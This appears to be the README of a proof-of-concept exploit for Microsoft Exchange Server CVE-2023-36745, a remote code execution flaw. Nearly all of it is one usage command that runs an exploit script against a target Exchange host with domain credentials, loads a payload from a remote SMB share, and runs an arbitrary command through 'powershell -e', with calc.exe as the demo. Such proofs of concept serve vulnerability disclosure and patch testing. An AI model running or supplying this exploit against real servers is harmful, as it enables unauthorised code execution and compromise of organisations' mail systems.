# CVE-2023-36745
Microsoft Exchange Server CVE-2023-36745 RCE PoC.   
Example: 
```
python3 exp.py -H exchange.webdxg.com -u webdxg.com\dddai -p 4IDF7LAU -s \\192.168.237.131\Shares\ -c calc.exe
```
Command will be passed to `powershell -e`.
